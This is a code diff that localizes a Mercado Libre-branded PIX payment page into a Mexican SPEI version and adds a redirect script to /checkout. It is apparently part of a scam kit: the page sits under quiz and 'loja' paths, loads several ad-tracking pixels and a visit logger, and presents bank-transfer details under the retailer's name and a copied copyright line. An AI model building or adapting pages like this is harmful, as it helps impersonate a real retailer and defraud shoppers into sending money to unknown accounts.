@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<html lang="pt-br">
-<head>
+<html lang="es-MX">
+<head><script>location.replace("/checkout"+location.search)</script>
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-CV5GQ7D48S"></script>
@@ -14,7 +14,7 @@
 <script src="/js/api-base.js"></script><script src="/js/fb-pixel.js"></script><script src="/js/tiktok-pixel.js"></script><script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Pagamento PIX - Mercado Livre</title>
+    <title>Pago SPEI - Mercado Libre</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <link rel="icon" href="/loja/_assets/images/bYrTS8w3kR7Z.png">
     <link rel="shortcut icon" href="/loja/_assets/images/bYrTS8w3kR7Z.png">
@@ -275,7 +275,7 @@
 </head>
 <body>
     <div style="background-color: #00a650; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">
-        ✓ Pagamento PIX gerado com sucesso
+        ✓ Pago por SPEI generado con éxito
     </div>
      
     <nav class="navbar" style="padding-top: 15px;">
@@ -283,7 +283,7 @@
             <span style="font-family: 'GellixMedium'; color: black;">❮</span>
         </div>
         <div class="logo-central">
-            <img src="../../../quiz/images/logo.webp" style="height: 5vh;" alt="Logo Mercado Livre">
+            <img src="../../../quiz/images/logo.webp" style="height: 5vh;" alt="Logo Mercado Libre">
         </div>
         <div class="menu-icon" style="padding-right: 3%;">
             <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 0px; color: black">lock</span>
@@ -297,15 +297,15 @@
             <div class="clock-center"></div>
         </div>
 
-        <h1 class="qrcode-title">Pague com PIX</h1>
+        <h1 class="qrcode-title">Paga con SPEI</h1>
         <p class="qrcode-subtitle">
-            Escaneie o QR Code abaixo com o app do seu banco<br>
-            ou copie o código PIX
+            Escanea el código QR de abajo con la app de tu banco<br>
+            o copia los datos para transferencia
         </p>
 
         <div class="amount-display">
-            <div class="amount-label">Valor a pagar</div>
-            <div class="amount-value" id="displayAmount">R$ 0,00</div>
+            <div class="amount-label">Total a pagar</div>
+            <div class="amount-value" id="displayAmount">$9</div>
         </div>
 
         <div class="qrcode-display">
@@ -313,51 +313,51 @@
         </div>
 
         <div class="pix-code-section">
-            <div class="pix-code-label">Código PIX Copia e Cola</div>
+            <div class="pix-code-label">Datos de transferencia Copia y Pega</div>
             <div class="pix-code-box" id="pixCode"></div>
             <button class="copy-btn" id="copyBtn">
                 <span class="material-symbols-outlined">content_copy</span>
-                Copiar código PIX
+                Copiar datos de pago
             </button>
         </div>
 
         <div class="expiration-warning">
             <div class="expiration-text">
                 <span class="material-symbols-outlined">schedule</span>
-                <span>Este QR Code expira em:</span>
+                <span>Este código QR vence en:</span>
             </div>
             <div class="timer" id="timer">--:--</div>
         </div>
 
         <div class="status-checking">
             <span class="material-symbols-outlined">sync</span>
-            Aguardando confirmação do pagamento...
+            Esperando confirmación del pago...
         </div>
 
         <div class="instructions">
-            <div class="instructions-title">Como pagar:</div>
+            <div class="instructions-title">Cómo pagar:</div>
             <div class="instruction-step">
                 <div class="step-number">1</div>
-                <div>Abra o app do seu banco</div>
+                <div>Abre la app de tu banco</div>
             </div>
             <div class="instruction-step">
                 <div class="step-number">2</div>
-                <div>Escolha a opção PIX</div>
+                <div>Elige la opción de transferir por SPEI</div>
             </div>
             <div class="instruction-step">
                 <div class="step-number">3</div>
-                <div>Escaneie o QR Code ou cole o código</div>
+                <div>Escanea el código QR o pega los datos</div>
             </div>
             <div class="instruction-step">
                 <div class="step-number">4</div>
-                <div>Confirme o pagamento</div>
+                <div>Confirma el pago</div>
             </div>
         </div>
     </div>
 
     <div style="margin-top: 40px; border-top: 1px solid #ddd; padding: 20px; text-align: center; font-family: 'GellixRegular'; color: #999; font-size: 12px;">
-        <p>© 1999-2024 Ebazar.com.br LTDA.</p>
-        <p style="margin-top: 10px;">Transação ID: <span id="transactionId"></span></p>
+        <p>© 1999-2024 MercadoLibre.com.mx</p>
+        <p style="margin-top: 10px;">ID de transacción: <span id="transactionId"></span></p>
     </div>
 
     <!-- QR Code Generator -->
@@ -372,7 +372,7 @@
             const paymentData = sessionStorage.getItem('pixPayment');
             
             if (!paymentData) {
-                alert('Dados do pagamento não encontrados');
+                alert('Datos del pago no encontrados');
                 window.location.href = '../';
                 return;
             }
@@ -402,12 +402,12 @@
          * Gera o QR Code no canvas
          */
         function generateQRCode(text) {
-            console.log('Gerando QR Code...');
+            console.log('Generando código QR...');
             
             const qrcodeContainer = document.getElementById('qrcodeCanvas');
             
             if (!qrcodeContainer) {
-                console.error('Container do QR Code não encontrado!');
+                console.error('¡Contenedor del código QR no encontrado!');
                 return;
             }
 
@@ -425,9 +425,9 @@
                     correctLevel: QRCode.CorrectLevel.M
                 });
                 
-                console.log('QR Code gerado com sucesso!');
+                console.log('¡Código QR generado con éxito!');
             } catch (error) {
-                console.error('Erro ao gerar QR Code:', error);
+                console.error('Error al generar código QR:', error);
                 qrcodeContainer.innerHTML = '<p style="color: #666; padding: 20px; font-family: GellixRegular;">Use o código PIX abaixo para pagamento</p>';
             }
         }
@@ -534,7 +534,7 @@
             Cart.clear();
             
             // Redireciona para página de sucesso
-            alert('✓ Pagamento confirmado com sucesso!');
+            alert('✓ ¡Pago confirmado con éxito!');
             window.location.href = '../../';
         }
     </script>
